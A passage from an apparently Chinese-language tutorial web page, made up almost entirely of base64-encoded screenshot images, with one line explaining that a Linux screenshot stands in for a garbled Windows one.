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'/></p>
<p>这里因为我的windows返回的这行字有一点乱码所以放一张Linux的正常图片，下面是windows的示例：</p>
<p><img src='data:img/jpg;base64,iVBORw0KGgoAAAANSUhEUgAAA8cAAAC2CAYAAAD0mf+jAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAACbISURBVHhe7d07j13XleDxw44d+DuYVCAwMWgP
MJQCBwM0KCUEBlDgpIAJqB4DGnJgGKhAITMFTaqDaTEpKDOUmEmLqQNLAwOyDBiEgDHlxMlEA5gg
iIE7Yd916y5y1aq1X+dx7zn3/H/AUZ2zH2uvve+jaus+eOXly5evup3T09Pu008/3V0BAAAAALAO
/7D7CQAAAADAarE5BgAAAACsHptjAAAAAMDqsTkGAAAAAKwem2MAAAAAwOqxOQYAAAAArB6bYwAA
AADA6jX/O8cP/uVfd2f93Pvon3ZnAAAAAADMQ69Xjv/LP94qHv/n//77pZ8H9f3D7p0r73QPv99d
t3jyYXflnYddn66YAW4/AAAAoNmVK1eqjrmRnP7whz/sri6TuijvXpvj///i/xWP//Zf3730s+xJ
96FZ5CsfPtmVK6nvucGdvSXPzd5uH26uDNmYvq7T+R3z7QgAAAAcj1evXmWPOfrmm2+6//zOu+EG
WcqkTtp4vTbH/+knN3odWdtN1Htd96VZ7NuPu3cu7KBudb960HVf/FuPXdXVu91Xr77q7l7dXc/O
gLlV+b57+M6V7tL/bxhM4j7ubu9usy/vPOreez3IZhN8/+3umd6eX17v7l2TzfPUcwUAAACwVjdu
3Oj+91e/u7RB1o2x1EkbbyZfyLXZRL33qLuz2Rh/dmtXJG591n3ldrNX3/9AdlVH+RbZZc7tanf3
q882291zt27f6bqnf97N4Vb32Vd3Ny12bt3u7nRPuz9vKo/5dgQAAABwWH6DXNoYi0GbY32F14vK
sp487h7dfND9ym6MLft54avvdx9097pPzCugTz68Yl5hPn+L75sXL3efN93G0Lf87t7W+/DNW34v
vkJ9HuP124E3G/eLXL15K3FVLpvT7x++c7l/MDdxue35q8AXcs7Gljyudfe+7rpH723KXn/+9uI8
Lua9WZ8nsmbndds5mLdIX1yvN548ftTd/OD9NxtiS27n7nr3llQm5hrn1JrPxRiXbz8rXoPzNbx4
u755m3/cBwAAAMB82A1yaWMsem+OZQOsmwPdDDdvinu52t39+E736PGbXdW1t292X3/37PxiswF7
evNm91RentxepjZrX3f3vru9zfnVswddd+/EfB724tu7v7yz7bBzXv/0wbPX9a++7Lr3dhupqlw2
G/WTe9c3Q+gY+srr5bnJ/xi43Pa83dfmlVeJfefju4nYt7rPXj3rHtzstq/Ov9q+mivzuN+9/Uzb
Pes++OKaedv1Zn3ud93nUrdZgO2m+rFdr0+2893a/o+H8/vC49uvLr3avyVttu8OyMw1WNs3sWrz
Kd1+VnoNrt79avsW8ftyp9hswt97+qB7tn1bQ2ndAAAAgMt071Q6cDijvK1ab0R7Y8rGYTT+88Ly
9txHj3eboU31+x90N3fXTx4/7T74/OPu+nbj+H3356c3uw/eDzZr3c3ugb5ULa9ibjaOW8Gr2Nu3
Cqtd/ed2A3jrV5uN56NO9nlVuVx9q7vePdpsqIMvpXJzS7aVdl9/0Z1/bPdJ9/jRne625JyLbW1f
xd1sOK/pA/H8lWXdyG/X5/PdW6JlrAvrJWOcvz36/Fpun/PN4u3Hm1jum6G3r8Je+6L7YLOhvPi2
eTfXaG1fq8yndPtZhTW49dmX3fV717or7z19M3Zx3QAAAIDLzl9YKR8Yj30rtX2Ldcoom2O9EfWn
3SRXubDRq3Gru62v6ont5lY2R5tN4tMPuvevXuve7jbxnvzb5r9yfd5sWje7t69tflTlIq/kyp3/
8647kQ2W3ci6uSXbvvlSq+8f3u8e3bm9Kcm1D2w2ka+/LGt3hK/6NpANpb0t5e3I1777eBM7+jI0
P9cD6LMGE6wbAAAAgPH4zxj7zyBHem+OZQOsGwPdDEebYm2Td77Ru3fNbeSefHj+ec7t23Yv1t06
3xnuXqG82m2/3+lks0m8/tbmand9/4uuS33+NWW7Ubefhf2+e3jffGZ1V39ik3nySXfv9ca3IpfN
fB5u48uXWcnbnb/u9J3Y4sLcMm3Pv9Tqk+6TTejXr6IWYr92aZ6y3G8+Y1tNbhvznuLtRv3mbi02
dfcf3em+vPBy8UUX5noppyfdw9aNc+n2k3z1vlRYgycfnr/F+/xd97tXw8daNwAAAACTSH35VmmD
POiVY9kMRxtiYTfMqTaWfMbz/J/6OW+/PR7fTr8it/1CpzevUG43il9/3d3ZvrdYr2U/2rQ13rjV
faafad3mcbIJYt+WK6/M7t5uq3nKR1zNtzIXc7l6t3tL3n687X+tu3f9y4tvN7Zzy7Xd1H18/VH3
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
